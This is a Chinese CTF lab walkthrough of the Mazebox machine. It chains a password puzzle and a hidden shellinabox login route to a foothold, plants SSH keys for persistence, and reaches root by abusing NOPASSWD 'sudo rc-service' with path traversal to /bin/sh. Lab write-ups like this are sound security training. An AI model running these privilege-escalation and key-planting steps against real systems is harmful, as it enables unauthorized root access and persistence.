# Mazebox 靶机复盘：Shellinabox 到 rc-service 提权

> 本文记录的是隔离环境中的授权靶机复盘。Web 终端登录与 sudo 提权验证均不可用于未授权系统。

| 项目 | 本次记录 |
|------|----------|
| 靶机 | Mazebox（作者 Sublarge / MazeSec） |
| 目标地址 | 192.168.134.71 |
| 系统 | Alpine（OpenRC） |
| 开放端口 | 22/tcp（SSH）、80/tcp（Apache）、4200/tcp（shellinaboxd） |
| 凭据 | `lingmj` / `dphjwsk[bug]snd` |
| 最终路径 | 首页谜题拼口令 → `/supersecretbackend` 登录 → SSH 公钥 → `sudo rc-service` 任意路径脚本 → root |

![环境 / 启动](/content/mazebox/image-01.png)

## 1. 攻击链概览

```text
80：ASCII 谜题「cat a b c d e > password」+ 用户名 lingmj
  → /a…/e 五张 ASCII 图各藏签名 → dphjwsk[bug]snd
  → 4200 shellinaboxd：/ 是 cmatrix 烟雾弹；/top 自泄露完整 -s 路由
  → /supersecretbackend:LOGIN → lingmj shell + user flag
  → PasswordAuthentication no → 写 authorized_keys
  → sudo -l：NOPASSWD /sbin/rc-service
  → rc-service 接受任意路径的 openrc-run 脚本（或以路径指到 shell）→ root
```

## 2. 信息收集

```bash
nmap -sT -sV -sC -O -p- 192.168.134.71
```

| 端口 | 服务 | 备注 |
|------|------|------|
| 22/tcp | OpenSSH 10.3 | **PasswordAuthentication no**，只认公钥 |
| 80/tcp | Apache 2.4.67 (Unix) | ASCII 首页 + 谜题 |
| 4200/tcp | shellinaboxd | Web 终端，多服务路由 |

### 80 端口谜题

首页源码 / 页面右侧三行提示：

![首页源码线索](/content/mazebox/image-02.png)

```text
"Welcome to MazeSec"
cat a b c d e > password
lingmj
```

目录枚举（dirsearch / gobuster）确认根下主要就是 `a`–`e` 五个 200：

```bash
dirsearch -u http://192.168.134.71:80
# /a /b /c /d /e → 200
```

| 文件 | 画面 | 藏匿的签名 |
|------|------|------------|
| a | 恐龙 | `dp` |
| b | 青蛙 | `hjw` |
| c | 鳄鱼 | `sk` |
| d | 雪花 | `[bug]` |
| e | 猫 | `snd` |

按 `cat a b c d e` 的字面顺序拼接 → **`dphjwsk[bug]snd`**。用户名页面已给出：`lingmj`。

这些是 ASCII art 圈常见作者落款（如 hjw = Hayley Jane Wakenshaw 等），不是行尾空白那类隐写——拼签名即可。

## 3. 4200：shellinaboxd 与 `/top` 自泄露

`http://192.168.134.71:4200/` 根路径是全屏字符雨（**cmatrix**），按键没反应——烟雾弹，不是入口。

真正的服务布局（从进程命令行还原）：

```text
/usr/bin/shellinaboxd -t -d \
  -s /supersecretbackend:LOGIN \
  -s /top:nobody:nogroup:/:/usr/bin/top \
  -s /:nobody:nogroup:/:/usr/bin/cmatrix
```

| 路由 | 作用 |
|------|------|
| `/` | cmatrix，烟雾弹 |
| `/top` | 跑 `top`——**进程列表自泄露**完整 `-s` |
| `/supersecretbackend` | `LOGIN`：系统登录框 → lingmj shell |

![/top 暴露路由](/content/mazebox/image-03.png)

### 踩坑：目录爆破为什么打不到 `/top`

shellinaboxd 把 **URL 路径当服务路由**，不是文件系统。未匹配的路径全部落到 `/`（cmatrix），所以**任意路径都返回 200、HTML 壳几乎一样**（前端靠 `document.location.pathname` 决定连哪个服务）。

- 按响应大小过滤 → 全被滤掉  
- 不过滤 → 全是噪音  
- 高并发还容易把小 fork 服务器打卡  

正确姿势：直接访问 **`/top`**，看进程行里的 `shellinaboxd -s ...`，`/supersecretbackend` 不用爆破。

## 4. Foothold：`/supersecretbackend` 登录

浏览器打开 `http://192.168.134.71:4200/supersecretbackend`：

![Web 终端登录 lingmj](/content/mazebox/image-05.png)

```text
Mazebox login: lingmj
Password: dphjwsk[bug]snd
lingmj@Mazebox:~$ cat user.txt
flag{user-bd05572a9b360476ad73c022f66449ed}
```

![user flag](/content/mazebox/image-06.png)

SSH 密码登录是死路。进盒子后写公钥，再转密钥会话：

```bash
mkdir -p ~/.ssh
echo 'ssh-ed25519 AAAA... kali@kali' > ~/.ssh/authorized_keys
```

![SSH 公钥登录](/content/mazebox/image-07.png)

## 5. 提权：`rc-service` 滥用

```bash
sudo -l
```

![sudo -l](/content/mazebox/image-08.png)

```text
User lingmj may run the following commands on Mazebox:
    (ALL : ALL) NOPASSWD: /sbin/rc-service
```

`rc-service` 是 OpenRC 的服务管理器。对「服务名」**没有路径白名单**：参数里带 `/` 时，会当作 **openrc-run 脚本路径**，以 **root** 加载执行。

实操可以走相对路径直接指到 shell（本次截图路径）：

```bash
sudo /sbin/rc-service ../../bin/sh
```

![rc-service 提权](/content/mazebox/image-09.png)

```text
root@Mazebox:/home/lingmj# id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),...
root@Mazebox:/home/lingmj# cat /root/root.txt
flag{root-56ce09c6ee02f32146aed6c78557bde9}
```

等价思路：自己写一份 openrc-run 脚本（`command=` / `command_args=`），再：

```bash
sudo /sbin/rc-service /tmp/pwn/svc start
```

效果一样——本质都是「NOPASSWD 的 rc-service + 可控脚本路径 = root」。

拿到 root 后也可把公钥写入 `/root/.ssh/authorized_keys`（本机 `PermitRootLogin` 允许密钥），做宿主机级持久化。

## 6. 关键知识点

| 要点 | 复盘结论 |
|------|----------|
| 首页谜题 | `cat a b c d e > password` 是字面提示；拼的是五段 ASCII 签名，不是二进制隐写 |
| Shellinabox 路由 | 根路径烟雾弹；真正入口靠 `/top` 进程行，不靠 ffuf 扫路径 |
| 同 200 不同行为 | 路径爆破失效时，看交互差异（login / top / cmatrix） |
| SSH | 已禁密码认证；立足后优先 `authorized_keys` |
| `rc-service` | NOPASSWD 等同变相 root：任意路径 openrc-run / 路径穿越到 shell |

## 7. 复盘

Mazebox 线索排得很整齐：首页教你拼密码，`/top` 教你去哪登录，`sudo -l` 把提权二进制写在明面。真正容易空转的是 4200——对着 cmatrix 爆破路径不会有信号；看见 `top` 里的 `-s /supersecretbackend:LOGIN`，整条链就顺了。
